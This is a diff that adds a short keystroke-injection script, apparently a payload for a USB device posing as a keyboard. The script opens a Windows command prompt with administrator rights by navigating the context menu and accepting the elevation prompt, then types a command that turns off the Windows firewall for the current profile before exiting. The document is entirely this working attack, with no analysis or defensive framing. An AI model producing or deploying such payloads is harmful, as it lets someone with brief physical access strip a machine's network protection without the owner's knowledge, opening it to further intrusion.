@@ -1,0 +1,18 @@
+Delay 1000
+PressKey KEY_GUI_LEFT
+Delay 2000
+Print cmd
+Delay 2000
+PressModKey MOD_SHIFT_LEFT KEY_F10
+Delay 3000
+PressKey KEY_ARROW_DOWN
+Delay 4000
+PressKey KEY_ENTER
+Delay 3000
+PressKey KEY_ARROW_LEFT
+Delay 4000
+PressKey KEY_ENTER
+Delay 3000
+PrintLine netsh advfirewall set currentprofile state off
+Delay 3000
+PrintLine exit
